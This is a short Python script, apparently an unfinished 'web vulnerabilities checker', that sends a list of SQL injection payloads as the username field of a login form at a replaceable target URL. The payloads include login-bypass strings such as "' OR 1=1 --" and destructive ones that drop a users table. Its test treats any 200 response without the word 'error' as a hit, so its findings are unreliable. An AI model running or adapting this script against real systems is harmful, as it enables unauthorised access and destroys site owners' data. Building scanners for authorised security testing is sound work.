//Everlyn Leon
//Web Vulnerabilities Checker
//In Progress

import requests

# List of SQL injection payloads
sql_payloads = [
    "' OR 1=1 --",
    "' OR 'a'='a",
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "\"; DROP TABLE users; --",
    "admin'--",
    "admin' OR '1'='1"
]

# Set the target URL
url = "http://example.com/login"  # Replace with the target URL

# Payload data (e.g., form field names)
payload_data = {
    'username': '',
    'password': 'password123'
}

# Function to test each SQL injection payload
def test_sql_injection():
    for payload in sql_payloads:
        payload_data['username'] = payload
        response = requests.post(url, data=payload_data)

        if "error" not in response.text and response.status_code == 200:
            print(f"Possible SQL injection vulnerability with payload: {payload}")

# Run the SQL injection test
test_sql_injection()
